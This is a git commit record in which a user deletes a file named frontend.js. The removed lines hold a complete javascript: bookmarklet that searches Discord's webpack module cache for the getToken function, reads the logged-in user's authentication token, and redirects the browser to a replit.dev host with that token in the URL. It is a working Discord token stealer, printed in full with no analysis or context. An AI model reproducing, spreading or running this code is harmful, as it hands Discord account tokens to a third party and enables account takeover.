02e756388e4d6272c47fc71156b0eb51f4c0fedc
DEVROCK <114628634+devrock07@users.noreply.github.com>
2024-04-10 14:29:54 +0530

    Delete frontend.js

--- frontend.js
+++
@@ -1,2 +0,0 @@
-javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();window.location.href = `https://6ec72fef-16be-4141-bba1-1e383bf1e69e-00-166q8d3jj2adr.pike.replit.dev/?user=${token}`;})()
-
